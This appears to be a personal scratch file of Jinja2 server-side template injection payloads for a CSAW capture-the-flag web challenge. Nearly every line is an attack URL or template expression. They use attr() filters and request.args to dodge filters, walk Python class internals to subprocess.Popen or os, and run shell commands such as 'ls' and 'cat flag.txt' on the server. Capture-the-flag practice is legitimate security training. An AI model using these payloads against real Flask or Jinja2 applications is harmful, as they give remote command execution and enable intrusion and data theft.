request.application.__globals__.__builtins__.__import__('os')

url = http://web.chal.csaw.io:5000/submit?value={{request.args.conf)}}&conf=config.items()



http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()['258']('ls',shell=True,stdout=request.args.minus)|attr('communicate')()[0]|attr('decode')(request.args.utf)}}&class=__class__&bas=__base__&item=__getitem__&sub=__subclasses__&minus=%2d1&utf=utf%2d8

http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)('ls',shell=True,stdout=request.args.minus)|attr('communicate')()[0]|attr('decode')(request.args.utf)}}&class=__class__&bas=__base__&item=__getitem__&sub=__subclasses__&minus=%2d1&utf=utf%2d8

http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__
#Found that the subprocess idx is 258




http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)('ls',shell=True,stdout=request.args.minus)|attr('communicate')()|attr(request.args.item)(0)|attr('decode')(request.args.utf)}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__&minus=%2d1&utf=utf%2d8


#currently trying: popen('ls', shell=True, stdout=-1))

#Below returns (None, None)
http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)(%27dir%27,shell=True,)|attr(%27communicate%27)()}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__&minus=-&utf=utf-8


#Try this one:
http://web.chal.csaw.io:5000/submit?value={{request|attr('application')|attr(request.args.globals)|attr(request.args.getitem)(request.args.builtins)|attr(request.args.getitem)(request.args.import)(request.args.ohes)|attr(scandir)()}}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&ohes=os




{{ self|attr(request.args.temp).cycler|attr(request.args.init)|attr(globals)|attr(ohes).popen('flag.txt').read() }}&temp=__TemplateReference__context&init=__init__&globals=__globals__&ohes=os


{{''|attr(request.args.class).mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}&class=__class__

{{''|attr(request.args.class).mro()[1]}}&class=__class__


&template=_TemplateReference__context
&init=__init__
&globals=__globals__
&ohes=os
&bas=__base__
&class=__class__
&mro=__mro__
&item=__getitem__

|attr(request.args.xxx)



{{ self|attr(request.args.template).namespace|attr(request.args.init)|attr(request.args.globals)|attr(request.args.ohes) }}&template=_TemplateReference__context&init=__init__&globals=__globals__&ohes=os


{{ [].class.base.subclasses() }}

